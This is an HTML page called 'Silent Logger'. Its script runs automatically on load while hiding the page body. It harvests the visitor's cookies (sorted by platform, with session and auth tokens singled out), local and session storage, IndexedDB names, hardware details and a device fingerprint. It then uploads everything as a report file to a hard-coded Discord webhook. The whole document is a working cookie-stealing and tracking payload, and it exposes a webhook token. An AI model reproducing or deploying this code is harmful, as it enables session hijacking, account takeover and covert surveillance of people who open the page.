<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Silent Logger</title>
    <style>
        body {
            background: #fff;
            margin: 0;
            padding: 0;
            font-family: system-ui, -apple-system, sans-serif;
            visibility: hidden; /* Hides everything initially */
        }
        #download-area {
            visibility: visible;
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #f0f0f0;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            font-family: monospace;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            z-index: 9999;
        }
        #download-link {
            color: #0066cc;
            text-decoration: none;
        }
        #status {
            visibility: visible;
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(0,0,0,0.7);
            color: #0f0;
            padding: 4px 8px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 11px;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div id="status">⚙️ Initializing...</div>
    <div id="download-area" style="display:none;">
        📥 <a href="#" id="download-link">Save full report (.txt)</a>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

        // ========== COOKIE CATEGORIZATION ==========
        function categorizeCookie(name, value) {
            const lowerName = name.toLowerCase();
            const lowerValue = value.toLowerCase();
            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook")) return "Facebook / Meta";
            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerValue.includes("google")) return "Google / YouTube";
            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter")) return "Twitter (X)";
            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon")) return "Amazon";
            if (lowerName.includes("reddit") || lowerValue.includes("reddit")) return "Reddit";
            if (lowerName.includes("instagram") || lowerValue.includes("instagram")) return "Instagram";
            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin")) return "LinkedIn";
            if (lowerName.includes("discord") || lowerValue.includes("discord")) return "Discord";
            if (lowerName.includes("github") || lowerValue.includes("github")) return "GitHub";
            if (lowerName.includes("cloudflare") || lowerName.includes("__cf")) return "Cloudflare";
            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt")) return "Session / Auth (generic)";
            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel")) return "Advertising / Tracker";
            return "Unknown / Other";
        }

        // ========== DATA COLLECTION ==========
        function getAllCookies() {
            const cookieString = document.cookie;
            if (!cookieString) return [];
            const cookies = cookieString.split(';').map(c => c.trim()).filter(c => c);
            return cookies.map(c => {
                const [name, ...rest] = c.split('=');
                const value = rest.join('=');
                return { name: name.trim(), value: value || "", platform: categorizeCookie(name, value) };
            });
        }

        function getAllLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    try {
                        items[key] = localStorage.getItem(key);
                    } catch(e) { items[key] = "[Error reading]"; }
                }
                return items;
            } catch(e) { return { error: e.message }; }
        }

        function getAllSessionStorage() {
            try {
                const items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    try {
                        items[key] = sessionStorage.getItem(key);
                    } catch(e) { items[key] = "[Error reading]"; }
                }
                return items;
            } catch(e) { return { error: e.message }; }
        }

        async function getAllIndexedDB() {
            if (!window.indexedDB) return { error: "IndexedDB not supported" };
            if (window.indexedDB.databases) {
                try {
                    return await window.indexedDB.databases();
                } catch(e) { return { error: e.message }; }
            }
            return { info: "Cannot enumerate IndexedDB automatically" };
        }

        function getGPU() {
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                if (!gl) return { error: "WebGL unavailable" };
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                if (debugInfo) {
                    return {
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                    };
                }
                return { error: "WEBGL_debug_renderer_info not available" };
            } catch(e) { return { error: e.message }; }
        }

        async function getBattery() {
            if (!navigator.getBattery) return "Unavailable";
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level * 100) + "%", charging: b.charging };
            } catch(e) { return "Error"; }
        }

        function getConnection() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "Unavailable";
            return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData
            };
        }

        function getPlugins() {
            try {
                return Array.from(navigator.plugins).map(p => p.name);
            } catch(e) { return []; }
        }

        async function generateFingerprint() {
            const gpu = getGPU();
            const raw = [
                navigator.userAgent,
                navigator.language,
                screen.width, screen.height, screen.colorDepth,
                navigator.hardwareConcurrency,
                navigator.deviceMemory,
                gpu.renderer || "",
                gpu.vendor || "",
                new Date().getTimezoneOffset()
            ].join("|");
            const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
        }

        async function collectAllData() {
            const gpu = getGPU();
            const cookies = getAllCookies();
            const localStorage = getAllLocalStorage();
            const sessionStorage = getAllSessionStorage();
            const indexedDB = await getAllIndexedDB();
            const fingerprint = await generateFingerprint();
            
            const platformGroups = {};
            for (const cookie of cookies) {
                if (!platformGroups[cookie.platform]) platformGroups[cookie.platform] = [];
                platformGroups[cookie.platform].push(cookie);
            }
            
            return {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                cookies: cookies,
                cookiesGrouped: platformGroups,
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                indexedDB: indexedDB,
                navigator: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    onLine: navigator.onLine
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: screen.orientation?.type || "n/a"
                },
                gpu: gpu,
                battery: await getBattery(),
                connection: getConnection(),
                plugins: getPlugins(),
                fingerprint: fingerprint,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // ========== GENERATE TXT REPORT ==========
        async function generateTextReport(data) {
            let report = "=".repeat(80) + "\n";
            report += "          ULTIMATE PRIVATE LOGGER REPORT\n";
            report += "=".repeat(80) + "\n\n";
            report += `Generated: ${data.timestamp}\n`;
            report += `Page URL: ${data.url}\n`;
            report += `Referrer: ${data.referrer || "(none)"}\n`;
            report += `Timezone: ${data.timezone}\n\n`;
            
            report += "-".repeat(80) + "\n";
            report += "🍪 COOKIES (by platform)\n";
            report += "-".repeat(80) + "\n";
            for (const [platform, cookies] of Object.entries(data.cookiesGrouped)) {
                report += `\n[${platform}] (${cookies.length} cookies)\n`;
                for (const cookie of cookies) {
                    report += `  • ${cookie.name} = ${cookie.value.length > 100 ? cookie.value.substring(0,100)+"..." : cookie.value}\n`;
                }
            }
            if (data.cookies.length === 0) report += "\nNo cookies found.\n";
            
            report += "\n" + "-".repeat(80) + "\n";
            report += "💾 LOCALSTORAGE\n";
            report += "-".repeat(80) + "\n";
            for (const [key, val] of Object.entries(data.localStorage)) {
                let valueStr = typeof val === 'string' ? val : JSON.stringify(val);
                report += `${key} = ${valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr}\n`;
            }
            
            report += "\n" + "-".repeat(80) + "\n";
            report += "📦 SESSIONSTORAGE\n";
            report += "-".repeat(80) + "\n";
            for (const [key, val] of Object.entries(data.sessionStorage)) {
                let valueStr = typeof val === 'string' ? val : JSON.stringify(val);
                report += `${key} = ${valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr}\n`;
            }
            
            report += "\n" + "-".repeat(80) + "\n";
            report += "🗃️ INDEXEDDB DATABASES\n";
            report += "-".repeat(80) + "\n";
            if (Array.isArray(data.indexedDB)) {
                for (const db of data.indexedDB) {
                    report += `Name: ${db.name}, Version: ${db.version}\n`;
                }
            } else {
                report += JSON.stringify(data.indexedDB, null, 2);
            }
            
            report += "\n" + "-".repeat(80) + "\n";
            report += "🖥️ SYSTEM & BROWSER INFO\n";
            report += "-".repeat(80) + "\n";
            report += `User Agent: ${data.navigator.userAgent}\n`;
            report += `Platform: ${data.navigator.platform}\n`;
            report += `Language: ${data.navigator.language}\n`;
            report += `CPU Cores: ${data.navigator.hardwareConcurrency || "unknown"}\n`;
            report += `RAM: ${data.navigator.deviceMemory || "unknown"} GB\n`;
            report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
            report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
            report += `Online: ${data.navigator.onLine}\n`;
            report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
            report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
            report += `Orientation: ${data.screen.orientation}\n`;
            report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
            report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;
            report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
            report += `Connection: ${JSON.stringify(data.connection)}\n`;
            report += `\nPlugins: ${data.plugins.join(", ") || "none"}\n`;
            report += `\n🔐 Fingerprint (SHA-256): ${data.fingerprint}\n`;
            report += "\n" + "=".repeat(80) + "\n";
            report += "END OF REPORT\n";
            report += "=".repeat(80);
            return report;
        }

        // ========== SEND AS FILE ATTACHMENT TO DISCORD ==========
        async function sendToWebhookAsFile(reportText, data) {
            const blob = new Blob([reportText], { type: "text/plain" });
            const formData = new FormData();
            const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
            formData.append("file", blob, filename);
            
            // Optional: add a small embed with summary
            const summary = {
                content: null,
                embeds: [{
                    title: "📥 Silent Logger Report",
                    description: `**URL:** ${data.url}\n**Cookies:** ${data.cookies.length} total\n**Platforms:** ${Object.keys(data.cookiesGrouped).join(", ")}\n**Fingerprint:** \`${data.fingerprint.slice(0,32)}...\``,
                    color: 0x00ff00,
                    footer: { text: "Full report attached as .txt" },
                    timestamp: data.timestamp
                }]
            };
            formData.append("payload_json", JSON.stringify(summary));
            
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    body: formData
                });
                if (response.ok) {
                    document.getElementById("status").innerHTML = "✅ Data sent to webhook (with .txt file)";
                } else {
                    document.getElementById("status").innerHTML = "⚠️ Webhook error: " + response.status;
                }
            } catch(e) {
                document.getElementById("status").innerHTML = "❌ Webhook send failed: " + e.message;
            }
        }

        // ========== MAIN EXECUTION (AUTOMATIC) ==========
        (async function() {
            const statusDiv = document.getElementById("status");
            try {
                statusDiv.innerHTML = "🔍 Collecting data...";
                const allData = await collectAllData();
                statusDiv.innerHTML = "📝 Generating report...";
                const reportText = await generateTextReport(allData);
                statusDiv.innerHTML = "📤 Sending to webhook...";
                await sendToWebhookAsFile(reportText, allData);
                
                // Prepare download link
                const blob = new Blob([reportText], { type: "text/plain" });
                const url = URL.createObjectURL(blob);
                const downloadLink = document.getElementById("download-link");
                downloadLink.href = url;
                downloadLink.download = `logger_${allData.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
                document.getElementById("download-area").style.display = "block";
                statusDiv.innerHTML = "✅ Done! Click the link to save local copy.";
            } catch(err) {
                statusDiv.innerHTML = "💥 Error: " + err.message;
                console.error(err);
            }
        })();
    </script>
</body>
</html>
